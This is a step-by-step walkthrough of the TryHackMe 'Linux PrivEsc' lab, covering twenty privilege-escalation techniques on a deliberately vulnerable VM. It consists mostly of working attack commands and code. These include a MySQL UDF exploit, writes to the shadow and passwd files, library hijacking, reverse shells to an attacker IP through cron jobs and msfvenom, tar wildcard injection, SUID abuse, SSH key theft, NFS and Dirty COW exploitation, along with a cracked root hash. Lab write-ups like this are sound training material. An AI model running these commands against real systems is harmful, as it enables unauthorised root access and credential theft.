# Linux PrivEsc

{% embed url="https://tryhackme.com/room/linuxprivesc" %}
https://tryhackme.com/room/linuxprivesc
{% endembed %}

## Task 1 Deploy the Vulnerable Debian VM <a href="#title" id="title"></a>

#### Deploy the machine and login to the "user" account using SSH.

```bash
echo 'HostkeyAlgorithms +ssh-rsa' >> .ssh/config
echo 'PubkeyAcceptedAlgorithms +ssh-rsa' >> .ssh/config
```

![](<../../.gitbook/assets/Screenshot from 2022-04-18 04-40-03.png>)

#### Run the "id" command. What is the result?

```
ssh user@10.10.177.44 id
```

![](<../../.gitbook/assets/Screenshot from 2020-09-01 09-34-25.png>)

## Task 2 Service Exploits

#### MySQL User Defined Functions (UDFs)

```
cd tools/mysql-udf/
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

![](<../../.gitbook/assets/Screenshot from 2022-04-18 19-48-03.png>)

```bash
use mysql;
create table foo(line blob);
insert into foo values(load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```

![](<../../.gitbook/assets/Screenshot from 2022-04-18 19-49-10.png>)

```bash
/tmp/rootbash -p
```

## Task 3 Weak File Permissions - Readable /etc/shadow

#### **What is the root user's password hash?**

```
scp user@10.10.177.44:/etc/shadow .
cut -d ':' -f 2 shadow | head -1 > sha512.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-01 09-43-11.png>)

{% hint style="success" %}
`$6$Tb/euwmK$OXA.dwMeOAcopwBl68boTG5zi65wIHsc84OWAIye5VITLLtVlaXvRDJXET..it8r.jbrlpfZeMdwD3B0fGxJI0`
{% endhint %}

#### **What hashing algorithm was used to produce the root user's password hash?**

{% hint style="success" %}
`sha512crypt`
{% endhint %}

#### What is the root user's password?

```
hashcat -a 0 -m 1800 sha512.txt /usr/share/wordlists/rockyou.txt
```

![](<../../.gitbook/assets/Screenshot from 2020-09-01 09-43-24.png>)

{% hint style="success" %}
`password123`
{% endhint %}

## Task 4 Weak File Permissions - Writable /etc/shadow

```bash
scp user@10.10.177.44:/etc/shadow .
openssl passwd -6 password1234
vim shadow
scp shadow user@10.10.177.44:/etc/shadow
```

![](<../../.gitbook/assets/Screenshot from 2020-09-01 09-57-34.png>)

## Task 5 Weak File Permissions - Writable /etc/passwd

#### **Run the "id" command as the newroot user. What is the result?**

```bash
echo "newroot:$(openssl passwd password):0:0:root:/root:/bin/bash" >> /etc/passwd
su - newroot
id
```

![](<../../.gitbook/assets/Screenshot from 2022-04-18 19-43-41.png>)

{% hint style="success" %}
`uid=0(root) gid=0(root) groups=0(root)`
{% endhint %}

## Task 6 Sudo - Shell Escape Sequences

#### **How many programs is "user" allowed to run via sudo?**&#x20;

```bash
sudo -l
```

![](<../../.gitbook/assets/Screenshot from 2020-09-01 10-17-35.png>)

{% hint style="success" %}
`11`
{% endhint %}

#### **One program on the list doesn't have a shell escape sequence on GTFOBins. Which is it?**

![](<../../.gitbook/assets/Screenshot from 2022-04-18 19-24-24.png>)

{% hint style="success" %}
`apache2`
{% endhint %}

#### **Consider how you might use this program with sudo to gain root privileges without a shell escape sequence.**

```bash
sudo /usr/bin/apache2 -f /etc/shadow
```

![](<../../.gitbook/assets/Screenshot from 2020-09-01 10-23-33.png>)

## Task 7 Sudo - Environment Variables

```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
	unsetenv("LD_LIBRARY_PATH");
	setresuid(0,0,0);
	system("/bin/bash -p");
}
```

```
ldd /usr/sbin/apache2
gcc -o /tmp/libcrypt.so.1 -shared -fPIC tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp /usr/sbin/apache2
```

![](<../../.gitbook/assets/Screenshot from 2020-09-01 10-35-54.png>)

```
LD_LIBRARY_PATH=/tmp ldd /usr/sbin/apache2
```

![](<../../.gitbook/assets/Screenshot from 2020-09-01 10-36-49.png>)

## Task 8 Cron Jobs - File Permissions

```bash
cat /etc/crontab
locate overwrite.sh
ls -lA /usr/local/bin/overwrite.sh
echo '#!/bin/bash' > /usr/local/bin/overwrite.sh
echo 'bash -i >& /dev/tcp/10.6.9.176/4444 0>&1' >> /usr/local/bin/overwrite.sh
```

![](<../../.gitbook/assets/Screenshot from 2022-04-18 05-16-42.png>)

```bash
nc -nvlp 4444
```

![](<../../.gitbook/assets/Screenshot from 2022-04-18 05-19-10.png>)

## Task 9 Cron Jobs - PATH Environment Variable

```bash
vim overwrite.sh
chmod +x overwrite.sh 
```

![](<../../.gitbook/assets/Screenshot from 2022-04-18 05-24-47.png>)

```bash
ls -lA /tmp/bash
/tmp/bash -p
```

![](<../../.gitbook/assets/Screenshot from 2022-04-18 05-26-52.png>)

#### What is the value of the PATH variable in /etc/crontab?

{% hint style="success" %}
`/home/user:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin`
{% endhint %}

## Task 10 Cron Jobs - Wildcards

```bash
ls -lA /usr/local/bin/compress.sh
cat /usr/local/bin/compress.sh
```

![](<../../.gitbook/assets/Screenshot from 2022-04-18 05-34-46.png>)

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.6.9.176 LPORT=4444 \
         -f elf -o reverse.elf
scp reverse.elf user@10.10.192.74:/home/user/reverse.elf
```

![](<../../.gitbook/assets/Screenshot from 2022-04-18 05-33-06.png>)

```bash
chmod +x reverse.elf 
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=reverse.elf
```

![](<../../.gitbook/assets/Screenshot from 2022-04-18 05-34-18.png>)

```bash
nc -nvlp 4444
```

![](<../../.gitbook/assets/Screenshot from 2022-04-18 05-37-18.png>)

## Task 11 SUID / SGID Executables - Known Exploits

```bash
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

![](<../../.gitbook/assets/Screenshot from 2022-04-18 05-42-23.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-18 05-42-54.png>)

```bash
./tools/suid/exim/cve-2016-1531.sh
```

![](<../../.gitbook/assets/Screenshot from 2022-04-18 05-43-45.png>)

## Task 12 SUID / SGID Executables - Shared Object Injection

```bash
ls -lA /usr/loca/bin/suid-so
/usr/local/bin/suid-so
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
mkdir -p .config
```

![](<../../.gitbook/assets/Screenshot from 2022-04-18 05-47-14.png>)

```bash
cat ./tools/suid/libcalc.c
gcc -shared -fPIC -o /home/user/.config/libcalc.so /home/user/tools/suid/libcalc.c
/usr/local/bin/suid-so
```

![](<../../.gitbook/assets/Screenshot from 2022-04-18 05-49-07.png>)

## Task 13 SUID / SGID Executables - Environment Variables

```bash
ls -lA /usr/local/bin/suid-env
/usr/local/bin/suid-env
strings /usr/local/bin/suid-env | grep apache
```

![](<../../.gitbook/assets/Screenshot from 2022-04-18 05-52-51.png>)

```bash
cat ./tools/suid/service.c
gcc -o service /home/user/tools/suid/service.c
PATH=.:$PATH /usr/local/bin/suid-env
```

![](<../../.gitbook/assets/Screenshot from 2022-04-18 05-54-45.png>)

## Task 14 SUID / SGID Executables - Abusing Shell Features (#1)

In Bash versions <4.2-048 it is possible to define shell functions with names that resemble file paths, then export those functions so that they are used instead of any actual executable at that file path.

```bash
ls -lA /usr/local/bin/suid-env2
strings /usr/local/bin/suid-env2 | grep apache
```

![](<../../.gitbook/assets/Screenshot from 2022-04-18 05-59-06.png>)

```bash
/bin/bash --version
function /usr/sbin/service { /bin/bash -p; }
export -f /usr/sbin/service
/usr/local/bin/suid-env2
```

![](<../../.gitbook/assets/Screenshot from 2022-04-18 05-58-52.png>)

## Task 15 SUID / SGID Executables - Abusing Shell Features (#2)

When in debugging mode, Bash uses the environment variable **PS4** to display an extra prompt for debugging statements. This will not work on Bash versions 4.4 and above.&#x20;

```bash
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash)' /usr/local/bin/suid-env2 2>/dev/null
/tmp/rootbash -p
```

![](<../../.gitbook/assets/Screenshot from 2022-04-18 06-05-34.png>)

## Task 16 Passwords & Keys - History Files

#### What is the full mysql command the user executed?

```bash
cat ~/.*history
su -
```

![](<../../.gitbook/assets/Screenshot from 2022-04-18 05-01-18.png>)

{% hint style="success" %}
`mysql -h somehost.local -uroot -ppassword123`
{% endhint %}

## Task 17 Passwords & Keys - Config Files

#### What file did you find the root user's credentials in?

```bash
cat myvpn.ovpn
cat /etc/openvpn/auth.txt
su -
```

![](<../../.gitbook/assets/Screenshot from 2022-04-18 05-05-22.png>)

{% hint style="success" %}
`/etc/openvpn/auth.txt`
{% endhint %}

## Task 18 Passwords & Keys - SSH Keys

```bash
ls -lA /
ls -lA /.ssh
```

![](<../../.gitbook/assets/Screenshot from 2022-04-18 05-10-12.png>)

```bash
scp user@10.10.192.74:/.ssh/root_key .
chmod 400 root_key
ssh -i root_key root@10.10.192.74
```

![](<../../.gitbook/assets/Screenshot from 2022-04-18 05-11-34.png>)

## Task 19 NFS

```
sudo su -
mkdir -p /tmp/nfs
mount -o rw,vers=3 10.10.192.74:/tmp/ /tmp/nfs
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
chmod +sx /tmp/nfs/shell.elf
```

![](<../../.gitbook/assets/Screenshot from 2022-04-18 04-54-35.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-18 04-54-45.png>)

```
cat /etc/exports
/tmp/shell.elf
```

![](<../../.gitbook/assets/Screenshot from 2022-04-18 04-54-55.png>)

![](<../../.gitbook/assets/Screenshot from 2022-04-18 04-55-11.png>)

{% hint style="success" %}
`no_root_squash`
{% endhint %}

## Task 20 Kernel Exploits

It replaces the SUID file /usr/bin/passwd with one that spawns a shell

```bash
perl tools/kernel-exploits/linux-exploit-suggester-2/linux-exploit-suggester-2.pl
```

![](<../../.gitbook/assets/Screenshot from 2022-04-18 06-10-58.png>)

```bash
gcc -pthread ./tools/kernel-exploits/dirtycow/c0w.c -o c0w
./c0w
/usr/bin/passwd
```

![](<../../.gitbook/assets/Screenshot from 2022-04-18 06-13-35.png>)

## :link: Support Material

* [https://gist.github.com/KrE80r/42f8629577db95782d5e4f609f437a54](https://gist.github.com/KrE80r/42f8629577db95782d5e4f609f437a54)

{% embed url="https://unix.stackexchange.com/questions/81240/manually-generate-password-for-etc-shadow" %}

{% embed url="https://gtfobins.github.io/" %}

